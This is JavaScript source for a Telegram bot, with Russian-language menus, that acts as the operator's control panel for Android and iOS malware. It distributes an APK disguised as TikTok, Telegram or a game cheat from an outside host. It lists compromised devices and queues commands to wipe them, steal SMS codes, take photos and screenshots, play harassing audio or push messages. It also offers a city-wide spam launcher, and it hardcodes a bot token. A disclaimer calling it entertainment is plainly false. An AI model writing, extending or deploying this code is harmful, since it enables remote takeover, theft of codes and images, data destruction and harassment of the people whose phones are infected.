const { Telegraf, Markup } = require('telegraf');
const db = require('./db');

const BOT_TOKEN = '9001719911:AAEWc7prrsSLCM917VFtEPi-UNrqfHUCwPg';
const ADMIN_ID  = 9256345316;

const bot = new Telegraf(BOT_TOKEN);
const state = {};

function isAdmin(ctx) {
  return ctx.from && ctx.from.id === ADMIN_ID;
}

// Главное меню
bot.start((ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.reply("Приветствую тебя в нашем боте, бот используется в развлекательных целях конечно же.", Markup.inlineKeyboard([
    [Markup.button.callback('📦 Сделать файл', 'make_file')],
    [Markup.button.callback('📱 Мои устройства', 'my_devices')],
    [Markup.button.callback('🚀 Запуск', 'spam_start')]
  ]));
});

// Ветка Сделать файл
bot.action('make_file', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("На какое устройство?", Markup.inlineKeyboard([
    [Markup.button.callback('Андройд', 'os_android'), Markup.button.callback('Айфон', 'os_ios')],
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

bot.action('os_android', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл именно нужен?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'file_tt'), Markup.button.callback('Telegram', 'file_tg')],
    [Markup.button.callback('cheat', 'file_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action('os_ios', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл именно нужен?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'link_tt'), Markup.button.callback('Telegram', 'link_tg')],
    [Markup.button.callback('cheat', 'link_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action(/^file_(tt|tg|ch)$/, async (ctx) => {
  if (!isAdmin(ctx)) return;
  const type = ctx.match[1];
  ctx.answerCbQuery('Отправляю файл...');
  try {
    await ctx.replyWithDocument({ url: 'https://tnt.de3.netrun.io/cheatst2.apk', filename: `${type}.apk` });
  } catch (e) { ctx.reply('Ошибка: файл не найден.'); }
});

bot.action(/^link_(tt|tg|ch)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.answerCbQuery();
  ctx.reply(`Ссылка для iOS:\nhttps://tnt.de3.netrun.io/ios`);
});

// Ветка Мои устройства
bot.action('my_devices', (ctx) => {
  if (!isAdmin(ctx)) return;
  const list = db.listDevices();
  if (!list.length) return ctx.editMessageText('Ваши устройства:\n(пока пусто)', Markup.inlineKeyboard([[Markup.button.callback('« Назад', 'back_start')]]));
  const rows = list.map(d => ([Markup.button.callback(`${d.model || 'device'} · ${d.id.slice(0,6)}`, `dev:${d.id}`)]));
  rows.push([Markup.button.callback('« Назад', 'back_start')]);
  ctx.editMessageText('Ваши устройства:', Markup.inlineKeyboard(rows));
});

bot.action(/^dev:(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const id = ctx.match[1];
  ctx.editMessageText('Что хотите сделать с устройством?', Markup.inlineKeyboard([
    [Markup.button.callback('💥 Снести', `cmd:${id}:wipe`), Markup.button.callback('🔊 Стоны', `cmd:${id}:audio`)],
    [Markup.button.callback('🔥 Сжечь', `cmd:${id}:burn`), Markup.button.callback('💬 Текст', `cmd:${id}:text`)],
    [Markup.button.callback('🔑 Код', `cmd:${id}:sms`), Markup.button.callback('📷 Фото', `cmd:${id}:photo`)],
    [Markup.button.callback('📸 Скрин', `cmd:${id}:screen`)],
    [Markup.button.callback('« Назад', 'my_devices')]
  ]));
});

bot.action(/^cmd:([^:]+):(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const [, id, action] = ctx.match;
  if (action === 'text') {
    state[ctx.from.id] = { type: 'await_text', deviceId: id };
    return ctx.reply('Что писать?');
  }
  db.queueCommand(id, action, '');
  ctx.answerCbQuery('Команда отправлена');
});

// Ветка Запуск (Спам)
bot.action('spam_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  state[ctx.from.id] = { type: 'await_city' };
  ctx.editMessageText('По какому городу вы хотите запустить?');
});

bot.on('text', (ctx) => {
  if (!isAdmin(ctx)) return;
  const s = state[ctx.from.id];
  if (s && s.type === 'await_text') {
    db.queueCommand(s.deviceId, 'msg', ctx.message.text);
    delete state[ctx.from.id];
    return ctx.reply('Текст отправлен.');
  }
  if (s && s.type === 'await_city') {
    state[ctx.from.id] = { type: 'await_spam_text', city: ctx.message.text };
    return ctx.reply('Какой текст запускать?');
  }
  if (s && s.type === 'await_spam_text') {
    delete state[ctx.from.id];
    return ctx.reply(`🚀 Запуск спама!\nГород: ${s.city}\nТекст: ${ctx.message.text}`);
  }
});

bot.action('back_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Приветствую тебя в нашем боте, бот используется в развлекательных целях конечно же.", Markup.inlineKeyboard([
    [Markup.button.callback('📦 Сделать файл', 'make_file')],
    [Markup.button.callback('📱 Мои устройства', 'my_devices')],
    [Markup.button.callback('🚀 Запуск', 'spam_start')]
  ]));
});

bot.launch();
console.log('bot up');

module.exports = {
  bot,
  notifyAdmin: async (kind, buf, cap) => {
    if (!ADMIN_ID) return;
    if (kind === 'photo') await bot.telegram.sendPhoto(ADMIN_ID, { source: buf }, { caption: cap });
  }
};
